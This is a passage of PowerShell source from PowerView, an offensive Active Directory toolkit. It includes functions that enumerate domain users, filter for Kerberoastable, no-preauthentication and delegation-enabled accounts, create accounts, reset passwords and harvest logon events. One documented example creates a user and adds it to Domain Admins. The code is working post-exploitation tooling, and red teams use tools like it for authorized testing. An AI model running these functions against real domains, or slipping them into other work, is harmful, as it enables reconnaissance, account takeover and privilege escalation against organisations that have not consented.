$Objects = Get-DomainUser @SearcherArguments\n            if (-not $ReferenceObjectProperties) {\n                $ReferenceObjectProperties = $UserReferencePropertySet\n            }\n        }\n        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {\n            $Objects = Get-DomainGroup @SearcherArguments\n            if (-not $ReferenceObjectProperties) {\n                $ReferenceObjectProperties = $GroupReferencePropertySet\n            }\n        }\n        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {\n            $Objects = Get-DomainComputer @SearcherArguments\n            if (-not $ReferenceObjectProperties) {\n                $ReferenceObjectProperties = $ComputerReferencePropertySet\n            }\n        }\n        else {\n            throw \"[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName\"\n        }\n\n        ForEach ($Object in $Objects) {\n            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name\n            ForEach($ObjectProperty in $ObjectProperties) {\n                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {\n                    $Out = New-Object PSObject\n                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName\n                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty\n                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty\n                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')\n                    $Out\n                }\n            }\n        }\n    }\n}\n\n\n########################################################\n#\n# \"net *\" replacements and other fun start below\n#\n########################################################\n\nfunction Get-DomainUser {\n<#\n.SYNOPSIS\n\nReturn all users or specific user objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties samaccountname,usnchanged,...\". By default, all user objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted. Also accepts DOMAIN\\user format.\n\n.PARAMETER SPN\n\nSwitch. Only return user objects with non-null service principal names.\n\n.PARAMETER UACFilter\n\nDynamic parameter that accepts one or more values from $UACEnum, including\n\"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.\n\n.PARAMETER AdminCount\n\nSwitch. Return users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER AllowDelegation\n\nSwitch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'\n\n.PARAMETER DisallowDelegation\n\nSwitch. Return user accounts that are marked as 'sensitive and not allowed for delegation'\n\n.PARAMETER TrustedToAuth\n\nSwitch. Return computer objects that are trusted to authenticate for other principals.\n\n.PARAMETER PreauthNotRequired\n\nSwitch. Return user accounts with \"Do not require Kerberos preauthentication\" set.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainUser -Domain testlab.local\n\nReturn all users for the testlab.local domain\n\n.EXAMPLE\n\nGet-DomainUser \"S-1-5-21-890171859-3433809279-3366196753-1108\",\"administrator\"\n\nReturn the user with the given SID, as well as Administrator.\n\n.EXAMPLE\n\n'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff\n\nlastlogoff                                   samaccountname\n----------                                   --------------\n12/31/1600 4:00:00 PM                        dfm.a\n12/31/1600 4:00:00 PM                        dfm\n12/31/1600 4:00:00 PM                        harmj0y\n12/31/1600 4:00:00 PM                        Administrator\n\n.EXAMPLE\n\nGet-DomainUser -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -AdminCount -AllowDelegation\n\nSearch the specified OU for privileged user (AdminCount = 1) that allow delegation\n\n.EXAMPLE\n\nGet-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon\n\nSearch for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon\n\n.EXAMPLE\n\nGet-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED\n\nFind users who doesn't require Kerberos preauthentication and DON'T have an expired password.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainUser -Credential $Cred\n\n.EXAMPLE\n\nGet-Domain | Select-Object -Expand name\ntestlab.local\n\nGet-DomainUser dev\\user1 -Verbose -Properties distinguishedname\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))\n\ndistinguishedname\n-----------------\nCN=user1,CN=Users,DC=dev,DC=testlab,DC=local\n\n.INPUTS\n\nString\n\n.OUTPUTS\n\nPowerView.User\n\nCustom PSObject with translated user property fields.\n\nPowerView.User.Raw\n\nThe raw DirectoryServices.SearchResult object, if -Raw is enabled.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.User')]\n    [OutputType('PowerView.User.Raw')]\n    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [Switch]\n        $SPN,\n\n        [Switch]\n        $AdminCount,\n\n        [Parameter(ParameterSetName = 'AllowDelegation')]\n        [Switch]\n        $AllowDelegation,\n\n        [Parameter(ParameterSetName = 'DisallowDelegation')]\n        [Switch]\n        $DisallowDelegation,\n\n        [Switch]\n        $TrustedToAuth,\n\n        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]\n        [Switch]\n        $PreauthNotRequired,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    DynamicParam {\n        $UACValueNames = [Enum]::GetNames($UACEnum)\n        # add in the negations\n        $UACValueNames = $UACValueNames | ForEach-Object {$_; \"NOT_$_\"}\n        # create new dynamic parameter\n        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])\n    }\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $UserSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        #bind dynamic parameter to a friendly variable\n        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {\n            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters\n        }\n\n        if ($UserSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^S-1-') {\n                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                }\n                elseif ($IdentityInstance -match '^CN=') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $UserSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $UserSearcher) {\n                            Write-Warning \"[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                    $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                }\n                elseif ($IdentityInstance.Contains('\\')) {\n                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\\28', '(').Replace('\\29', ')') | Convert-ADName -OutputType Canonical\n                    if ($ConvertedIdentityInstance) {\n                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))\n                        $UserName = $IdentityInstance.Split('\\')[1]\n                        $IdentityFilter += \"(samAccountName=$UserName)\"\n                        $SearcherArguments['Domain'] = $UserDomain\n                        Write-Verbose \"[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'\"\n                        $UserSearcher = Get-DomainSearcher @SearcherArguments\n                    }\n                }\n                else {\n                    $IdentityFilter += \"(samAccountName=$IdentityInstance)\"\n                }\n            }\n\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['SPN']) {\n                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'\n                $Filter += '(servicePrincipalName=*)'\n            }\n            if ($PSBoundParameters['AllowDelegation']) {\n                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'\n                # negation of \"Accounts that are sensitive and not trusted for delegation\"\n                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'\n            }\n            if ($PSBoundParameters['DisallowDelegation']) {\n                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'\n                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'\n            }\n            if ($PSBoundParameters['AdminCount']) {\n                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'\n                $Filter += '(admincount=1)'\n            }\n            if ($PSBoundParameters['TrustedToAuth']) {\n                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'\n                $Filter += '(msds-allowedtodelegateto=*)'\n            }\n            if ($PSBoundParameters['PreauthNotRequired']) {\n                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'\n                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'\n            }\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainUser] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            # build the LDAP filter for the dynamic UAC filter value\n            $UACFilter | Where-Object {$_} | ForEach-Object {\n                if ($_ -match 'NOT_.*') {\n                    $UACField = $_.Substring(4)\n                    $UACValue = [Int]($UACEnum::$UACField)\n                    $Filter += \"(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))\"\n                }\n                else {\n                    $UACValue = [Int]($UACEnum::$_)\n                    $Filter += \"(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)\"\n                }\n            }\n\n            $UserSearcher.filter = \"(&(samAccountType=805306368)$Filter)\"\n            Write-Verbose \"[Get-DomainUser] filter string: $($UserSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }\n            else { $Results = $UserSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                if ($PSBoundParameters['Raw']) {\n                    # return raw result objects\n                    $User = $_\n                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')\n                }\n                else {\n                    $User = Convert-LDAPProperty -Properties $_.Properties\n                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')\n                }\n                $User\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainUser] Error disposing of the Results object: $_\"\n                }\n            }\n            $UserSearcher.dispose()\n        }\n    }\n}\n\n\nfunction New-DomainUser {\n<#\n.SYNOPSIS\n\nCreates a new domain user (assuming appropriate permissions) and returns the user object.\n\nTODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-PrincipalContext  \n\n.DESCRIPTION\n\nFirst binds to the specified domain context using Get-PrincipalContext.\nThe bound domain context is then used to create a new\nDirectoryServices.AccountManagement.UserPrincipal with the specified user properties.\n\n.PARAMETER SamAccountName\n\nSpecifies the Security Account Manager (SAM) account name of the user to create.\nMaximum of 256 characters. Mandatory.\n\n.PARAMETER AccountPassword\n\nSpecifies the password for the created user. Mandatory.\n\n.PARAMETER Name\n\nSpecifies the name of the user to create. If not provided, defaults to SamAccountName.\n\n.PARAMETER DisplayName\n\nSpecifies the display name of the user to create. If not provided, defaults to SamAccountName.\n\n.PARAMETER Description\n\nSpecifies the description of the user to create.\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for user/group principals, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nNew-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword\n\nCreates the 'harmj0y2' user with the specified description and password.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred\n\nCreates the 'harmj0y2' user with the specified description and password, using the specified\nalternate credentials.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nNew-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred\n\nCreates the 'andy' user with the specified description and password, using the specified\nalternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember\nand the alternate credentials.\n\n.OUTPUTS\n\nDirectoryServices.AccountManagement.UserPrincipal\n\n.LINK\n\nhttp://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]\n    Param(\n        [Parameter(Mandatory = $True)]\n        [ValidateLength(0, 256)]\n        [String]\n        $SamAccountName,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateNotNullOrEmpty()]\n        [Alias('Password')]\n        [Security.SecureString]\n        $AccountPassword,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Name,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $DisplayName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Description,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    $ContextArguments = @{\n        'Identity' = $SamAccountName\n    }\n    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }\n    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }\n    $Context = Get-PrincipalContext @ContextArguments\n\n    if ($Context) {\n        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)\n\n        # set all the appropriate user parameters\n        $User.SamAccountName = $Context.Identity\n        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n        $User.SetPassword($TempCred.GetNetworkCredential().Password)\n        $User.Enabled = $True\n        $User.PasswordNotRequired = $False\n\n        if ($PSBoundParameters['Name']) {\n            $User.Name = $Name\n        }\n        else {\n            $User.Name = $Context.Identity\n        }\n        if ($PSBoundParameters['DisplayName']) {\n            $User.DisplayName = $DisplayName\n        }\n        else {\n            $User.DisplayName = $Context.Identity\n        }\n\n        if ($PSBoundParameters['Description']) {\n            $User.Description = $Description\n        }\n\n        Write-Verbose \"[New-DomainUser] Attempting to create user '$SamAccountName'\"\n        try {\n            $Null = $User.Save()\n            Write-Verbose \"[New-DomainUser] User '$SamAccountName' successfully created\"\n            $User\n        }\n        catch {\n            Write-Warning \"[New-DomainUser] Error creating user '$SamAccountName' : $_\"\n        }\n    }\n}\n\n\nfunction Set-DomainUserPassword {\n<#\n.SYNOPSIS\n\nSets the password for a given user identity.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-PrincipalContext  \n\n.DESCRIPTION\n\nFirst binds to the specified domain context using Get-PrincipalContext.\nThe bound domain context is then used to search for the specified user -Identity,\nwhich returns a DirectoryServices.AccountManagement.UserPrincipal object. The\nSetPassword() function is then invoked on the user, setting the password to -AccountPassword.\n\n.PARAMETER Identity\n\nA user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nspecifying the user to reset the password for.\n\n.PARAMETER AccountPassword\n\nSpecifies the password to reset the target user's to. Mandatory.\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for the user identity, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity andy -AccountPassword $UserPassword\n\nResets the password for 'andy' to the password specified.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred\n\nResets the password for 'andy' usering the alternate credentials specified.\n\n.OUTPUTS\n\nDirectoryServices.AccountManagement.UserPrincipal\n\n.LINK\n\nhttp://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True)]\n        [Alias('UserName', 'UserIdentity', 'User')]\n        [String]\n        $Identity,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateNotNullOrEmpty()]\n        [Alias('Password')]\n        [Security.SecureString]\n        $AccountPassword,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    $ContextArguments = @{ 'Identity' = $Identity }\n    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }\n    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }\n    $Context = Get-PrincipalContext @ContextArguments\n\n    if ($Context) {\n        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)\n\n        if ($User) {\n            Write-Verbose \"[Set-DomainUserPassword] Attempting to set the password for user '$Identity'\"\n            try {\n                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n                $User.SetPassword($TempCred.GetNetworkCredential().Password)\n\n                $Null = $User.Save()\n                Write-Verbose \"[Set-DomainUserPassword] Password for user '$Identity' successfully reset\"\n            }\n            catch {\n                Write-Warning \"[Set-DomainUserPassword] Error setting password for user '$Identity' : $_\"\n            }\n        }\n        else {\n            Write-Warning \"[Set-DomainUserPassword] Unable to find user '$Identity'\"\n        }\n    }\n}\n\n\nfunction Get-DomainUserEvent {\n<#\n.SYNOPSIS\n\nEnumerate account logon events (ID 4624) and Logon with explicit credential\nevents (ID 4648) from the specified host (default of the localhost).\n\nAuthor: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis function uses an XML path filter passed to Get-WinEvent to retrieve\nsecurity events with IDs of 4624 (logon events) or 4648 (explicit credential\nlogon events) from -StartTime (default of now-1 day) to -EndTime (default of now).\nA maximum of -MaxEvents (default of 5000) are returned.\n\n.PARAMETER ComputerName\n\nSpecifies the computer name to retrieve events from, default of localhost.\n\n.PARAMETER StartTime\n\nThe [DateTime] object representing the start of when to collect events.\nDefault of [DateTime]::Now.AddDays(-1).\n\n.PARAMETER EndTime\n\nThe [DateTime] object representing the end of when to collect events.\nDefault of [DateTime]::Now.\n\n.PARAMETER MaxEvents\n\nThe maximum number of events to retrieve. Default of 5000.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target computer.\n\n.EXAMPLE\n\nGet-DomainUserEvent\n\nReturn logon events on the local machine.\n\n.EXAMPLE\n\nGet-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))\n\nReturn all logon events from the last 3 days from every domain controller in the current domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000\n\nReturn a max of 1000 logon events from the specified machine using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.LogonEvent\n\nPowerView.ExplicitCredentialLogonEvent\n\n.LINK\n\nhttp://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.LogonEvent')]\n    [OutputType('PowerView.ExplicitCredentialLogonEvent')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('dnshostname', 'HostName', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = $Env:COMPUTERNAME,\n\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $StartTime = [DateTime]::Now.AddDays(-1),\n\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $EndTime = [DateTime]::Now,\n\n        [ValidateRange(1, 1000000)]\n        [Int]\n        $MaxEvents = 5000,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        # the XML filter we're passing to Get-WinEvent\n        $XPathFilter = @\"\n<QueryList>\n    <Query Id=\"0\" Path=\"Security\">\n\n        <!-- Logon events -->\n        <Select Path=\"Security\">\n            *[\n                System[\n                    Provider[\n                        @Name='Microsoft-Windows-Security-Auditing'\n                    ]\n                    and (Level=4 or Level=0) and (EventID=4624)\n                    and TimeCreated[\n                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'\n                    ]\n                ]\n            ]\n            and\n            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]\n        </Select>\n\n        <!-- Logon with explicit credential events -->\n        <Select Path=\"Security\">\n            *[\n                System[\n                    Provider[\n                        @Name='Microsoft-Windows-Security-Auditing'\n                    ]\n                    and (Level=4 or Level=0) and (EventID=4648)\n                    and TimeCreated[\n                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'\n                    ]\n                ]\n            ]\n        </Select>\n\n        <Suppress Path=\"Security\">\n            *[\n                System[\n                    Provider[\n                        @Name='Microsoft-Windows-Security-Auditing'\n                    ]\n                    and\n                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)\n                ]\n            ]\n            and\n            *[\n                EventData[\n                    (\n                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')\n                        or\n                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'\n                        or\n                        Data[@Name='TargetUserSID']='S-1-5-18'\n                    )\n                ]\n            ]\n        </Suppress>\n    </Query>\n</QueryList>\n\"@\n        $EventArguments = @{\n            'FilterXPath' = $XPathFilter\n            'LogName' = 'Security'\n            'MaxEvents' = $MaxEvents\n        }\n        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n\n            $EventArguments['ComputerName'] = $Computer\n\n            Get-WinEvent @EventArguments| ForEach-Object {\n                $Event = $_\n                $Properties = $Event.Properties\n                Switch ($Event.Id) {\n                    # logon event\n                    4624 {\n                        # skip computer logons, for now...\n                        if(-not $Properties[5].Value.EndsWith('$')) {\n                            $Output = New-Object PSObject -Property @{\n                                ComputerName              = $Computer\n                                TimeCreated               = $Event.TimeCreated\n                                EventId                   = $Event.Id\n                                SubjectUserSid            = $Properties[0].Value.ToString()\n                                SubjectUserName           = $Properties[1].Value\n                                SubjectDomainName         = $Properties[2].Value\n                                SubjectLogonId            = $Properties[3].Value\n                                TargetUserSid             = $Properties[4].Value.ToString()\n                                TargetUserName            = $Properties[5].Value\n                                TargetDomainName          = $Properties[6].Value\n                                TargetLogonId             = $Properties[7].Value\n                                